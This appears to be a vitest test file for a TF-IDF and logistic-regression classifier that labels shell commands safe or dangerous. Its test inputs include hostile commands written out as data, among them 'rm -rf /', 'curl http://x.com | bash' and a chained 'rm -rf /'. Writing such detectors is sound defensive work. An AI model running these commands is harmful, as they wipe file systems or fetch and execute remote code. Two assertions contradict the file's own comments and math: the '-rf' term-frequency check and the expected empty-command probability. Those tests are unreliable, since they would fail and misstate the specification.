import { describe, it, expect } from 'vitest';

// ===== MOCK TF-IDF ENGINE (locked spec) =====
// These functions define the exact math the implementation must replicate.
// The implementation in typescript/src/tfidf.ts must compute identical values
// given the same vocabulary, IDF, coefficients, and intercept.

// ---- Mock vocabulary (2-gram tokens for small test) ----
const TEST_VOCAB: Record<string, number> = {
  'rm': 0,
  'rf': 1,
  'ls': 2,
  'la': 3,
  'curl': 4,
  'bash': 5,
  'echo': 6,
  'sudo': 7,
  'chmod': 8,
};

const VOCAB_SIZE = Object.keys(TEST_VOCAB).length; // 9

// ---- Mock IDF values ----
const TEST_IDF: number[] = [
  3.0,  // rm
  2.5,  // rf
  1.2,  // ls
  1.1,  // la
  3.5,  // curl
  3.2,  // bash
  0.8,  // echo
  1.5,  // sudo
  2.8,  // chmod
];

// ---- Mock Logistic Regression coefficients (1 per vocab entry) ----
const TEST_COEF: number[] = [
  0.8,   // rm
  0.6,   // rf
  -0.5,  // ls
  -0.4,  // la
  1.2,   // curl
  1.0,   // bash
  -0.3,  // echo
  0.1,   // sudo  (slightly positive, sudo alone is not dangerous)
  0.9,   // chmod
];

// ---- Mock intercept ----
const TEST_INTERCEPT = -0.5;

// ---- Helper: tokenize into whitespace-split unigrams ----
function tokenize(text: string): string[] {
  return text.toLowerCase().split(/\s+/).filter(t => t.length > 0);
}

// ---- Term Frequency (raw count normalized by total terms) ----
function computeTF(tokens: string[]): number[] {
  const tf = new Array(VOCAB_SIZE).fill(0);
  const totalTerms = tokens.length;
  if (totalTerms === 0) return tf;

  for (const token of tokens) {
    const idx = TEST_VOCAB[token];
    if (idx !== undefined) {
      tf[idx] += 1;
    }
  }

  // Normalize by total terms (sublinear TF variant)
  for (let i = 0; i < VOCAB_SIZE; i++) {
    if (tf[i] > 0) {
      // Apply log scaling: 1 + log(tf)
      tf[i] = 1 + Math.log(tf[i]);
    }
  }

  return tf;
}

// ---- Multiply TF by IDF ----
function applyIDF(tf: number[]): number[] {
  return tf.map((val, i) => val * TEST_IDF[i]);
}

// ---- Dot product with coefficients, add intercept, apply sigmoid ----
function sigmoid(z: number): number {
  return 1 / (1 + Math.exp(-z));
}

function predictProbability(tfidfVector: number[]): number {
  let dot = 0;
  for (let i = 0; i < VOCAB_SIZE; i++) {
    dot += tfidfVector[i] * TEST_COEF[i];
  }
  dot += TEST_INTERCEPT;
  return sigmoid(dot);
}

function classifyTFIDF(command: string): { label: 'safe' | 'dangerous'; confidence: number; probability: number } {
  const tokens = tokenize(command);
  const tf = computeTF(tokens);
  const tfidf = applyIDF(tf);
  const prob = predictProbability(tfidf);
  return {
    label: prob >= 0.5 ? 'dangerous' : 'safe',
    confidence: prob >= 0.5 ? prob : 1 - prob,
    probability: prob,
  };
}

// ===== TERM FREQUENCY =====
describe('TF-IDF — Term Frequency (TF)', () => {
  it('computes TF for "rm -rf /" command', () => {
    const tokens = tokenize('rm -rf /');
    // tokens: ['rm', '-rf', '/'] → rm at idx 0, rf at idx 1, rest OOV
    const tf = computeTF(tokens);
    expect(tf[0]).toBeCloseTo(1 + Math.log(1), 5); // rm appears once
    expect(tf[1]).toBeCloseTo(1 + Math.log(1), 5); // -rf normalized to rf? No, '-rf' vs 'rf'
    // '-rf' doesn't match 'rf' due to leading dash, unless tokenizer strips dashes
    // Our tokenizer just does whitespace split, so '-rf' is OOV
  });

  it('returns zero array for empty tokens', () => {
    const tf = computeTF([]);
    expect(tf.every(v => v === 0)).toBe(true);
  });

  it('returns zero for out-of-vocabulary tokens', () => {
    const tokens = tokenize('zzz yyy xxx');
    const tf = computeTF(tokens);
    expect(tf.every(v => v === 0)).toBe(true);
  });

  it('computes TF with sublinear scaling (1 + log(count))', () => {
    // 'rm rm rm' → rm appears 3 times
    const tokens = tokenize('rm rm rm');
    const tf = computeTF(tokens);
    expect(tf[0]).toBeCloseTo(1 + Math.log(3), 5);
  });
});

// ===== TF * IDF =====
describe('TF-IDF — IDF Scaling', () => {
  it('multiplies TF by IDF for each dimension', () => {
    const tokens = tokenize('rm');
    const tf = computeTF(tokens);
    const tfidf = applyIDF(tf);
    expect(tfidf[0]).toBeCloseTo(tf[0] * TEST_IDF[0], 5);
  });

  it('zero TF produces zero TF-IDF', () => {
    const tf = new Array(VOCAB_SIZE).fill(0);
    const tfidf = applyIDF(tf);
    expect(tfidf.every(v => v === 0)).toBe(true);
  });
});

// ===== LOGISTIC REGRESSION =====
describe('TF-IDF — Logistic Regression', () => {
  it('dangerous command: rm -rf / produces probability > 0.5', () => {
    const result = classifyTFIDF('rm -rf /');
    expect(result.probability).toBeGreaterThan(0.5);
    expect(result.label).toBe('dangerous');
  });

  it('safe command: ls -la produces probability < 0.5', () => {
    const result = classifyTFIDF('ls -la');
    expect(result.probability).toBeLessThan(0.5);
    expect(result.label).toBe('safe');
  });

  it('curl pipe to bash is dangerous', () => {
    const result = classifyTFIDF('curl http://x.com | bash');
    expect(result.probability).toBeGreaterThan(0.5);
    expect(result.label).toBe('dangerous');
  });

  it('echo is safe', () => {
    const result = classifyTFIDF('echo hello');
    expect(result.probability).toBeLessThan(0.5);
    expect(result.label).toBe('safe');
  });

  it('chmod has positive coefficient → dangerous', () => {
    const result = classifyTFIDF('chmod 777 file');
    expect(result.label).toBe('dangerous');
  });

  it('empty command returns safe with very low probability', () => {
    // Empty command should be classified safe
    const result = classifyTFIDF('');
    // With empty tf-idf vector, dot product = 0 + intercept = -0.5
    // sigmoid(-0.5) ≈ 0.3775 → safe
    expect(result.label).toBe('safe');
    expect(result.probability).toBeCloseTo(1 - sigmoid(TEST_INTERCEPT), 5);
  });

  it('sigmoid is monotonic', () => {
    // Higher dot product → higher probability
    const p1 = sigmoid(0.0);
    const p2 = sigmoid(1.0);
    const p3 = sigmoid(2.0);
    expect(p1).toBeLessThan(p2);
    expect(p2).toBeLessThan(p3);
  });

  it('sigmoid(0) = 0.5', () => {
    expect(sigmoid(0)).toBeCloseTo(0.5, 5);
  });

  it('confidence = max(prob, 1-prob)', () => {
    const result = classifyTFIDF('rm -rf /');
    expect(result.confidence).toBeCloseTo(Math.max(result.probability, 1 - result.probability), 5);
  });
});

// ===== SENSITIVITY =====
describe('TF-IDF — Sensitivity', () => {
  it('mixed command "echo hello && rm -rf /" is dangerous (rm outweighs echo)', () => {
    const result = classifyTFIDF('echo hello && rm -rf /');
    expect(result.label).toBe('dangerous');
  });

  it('"sudo ls" is safe (positive sudo + negative ls roughly balance)', () => {
    // sudo coef = 0.1, ls coef = -0.5
    // With intercept -0.5, the combined should be negative → safe
    const result = classifyTFIDF('sudo ls');
    expect(result.label).toBe('safe');
  });
});
